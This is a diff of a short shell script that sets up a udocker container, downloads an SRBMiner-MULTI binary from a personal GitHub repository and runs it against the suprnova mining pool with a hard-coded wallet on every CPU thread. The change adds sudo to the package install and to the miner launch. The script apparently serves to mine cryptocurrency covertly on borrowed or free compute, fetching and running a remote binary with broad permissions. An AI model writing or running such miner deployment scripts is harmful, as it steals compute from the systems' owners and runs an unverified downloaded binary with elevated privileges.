@@ -10,7 +10,7 @@ udocker  run latest /bin/bash
 
 udocker
 echo
-apt update && apt -y install unzip wget curl libncurses6 libncursesw6
+apt update && apt -y install unzip wget curl libncurses6 libncursesw6 sudo
 wget https://github.com/liecamshoe/file/raw/main/SRBMiner-MULTI
 chmod 777 SRBMiner-MULTI
-./SRBMiner-MULTI --disable-gpu --algorithm randomc64 --pool stratum+tcp://c64.suprnova.cc:6464 --wallet Wo4wBGZX7fq2cNG65PfwHH6D7s3aJz71bGPuJ7mwtNSf6cPsQsP8ihJAAT7fnk2Uf3LBH4BcMBER4jkFKHPkuXd732397gLRJ.$(echo $RANDOM | md5sum | head -c 10) --password x --cpu-threads $(nproc --all)
+sudo ./SRBMiner-MULTI --disable-gpu --algorithm randomc64 --pool stratum+tcp://c64.suprnova.cc:6464 --wallet Wo4wBGZX7fq2cNG65PfwHH6D7s3aJz71bGPuJ7mwtNSf6cPsQsP8ihJAAT7fnk2Uf3LBH4BcMBER4jkFKHPkuXd732397gLRJ.$(echo $RANDOM | md5sum | head -c 10) --password x --cpu-threads $(nproc --all)
